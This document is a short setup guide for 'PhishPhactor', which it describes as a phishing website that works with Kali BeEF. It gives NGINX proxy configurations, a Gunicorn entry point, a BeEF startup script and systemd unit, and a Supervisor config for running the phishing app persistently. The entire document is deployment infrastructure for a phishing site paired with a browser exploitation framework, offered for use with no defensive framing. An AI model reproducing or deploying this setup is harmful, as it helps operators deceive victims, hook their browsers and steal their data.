# The PhishPhactor is a phishing website that works with Kali BeEF.

###################################################################

[ System requirements ]
Works best with Ubuntu 18.04 or later
	- Ruby, Ruby-dev
	- Gunicorn
	- NGINX
	- Flask
	- Python 3.5 or later
	- Supervisor

###################################################################

NGINX Server Configuration
[ PhishPhactor Ports ]
server {
	listen 3001;
	server_name <internal-ip>;
	
	location / {
		proxy_pass http://0.0.0.0:5000;
		proxy_set_header X-Real-IP $remote_addr;
		include proxy_params;
	}
  }

[ BeEF ]
server {
	listen 3002;
	server_name <internal-ip>;

	location / {
		proxy_pass http://0.0.0.0:3000;
		proxy_set_header X-Real-IP $remote_addr;
		include proxy_params;
	}

 }

[ eof ]

##################################################################

[ Gunicorn Entry Point // wsgi.py ]
from app import app as application

if __name__ == "__main__":
	application.run()

[ eof ]

##################################################################
 
/usr/local/sbin/beef-startup.sh
[ BeEF Startup Bash Script ]

#!/bin/sh
cd beef && sudo ./beef

[ eof ]

##################################################################
/etc/systemd/system/beef-startup.service
[BeEF Systemd Startup ]
[Unit]
Description=BeEF Startup on Boot

[Service]
ExecStart=/usr/local/sbin/beef-startup.sh

[Install]
WantedBy=multi-user.target

[ eof ]

##################################################################

/etc/supervisor/conf.d/phishphactor
[program:phishphactor]
directory=/var/www/PhishPhactor
command=/usr/local/bin/gunicorn wsgi:application --bind localhost:5000
user=www-data
autostart=true
autorestart=true
stderr_logfile=/var/log/gunicorn/PhishPhactor.err.log
stdout_logfile=/var/log/gunicorn/PhishPhactor.out.log

[ eof ]
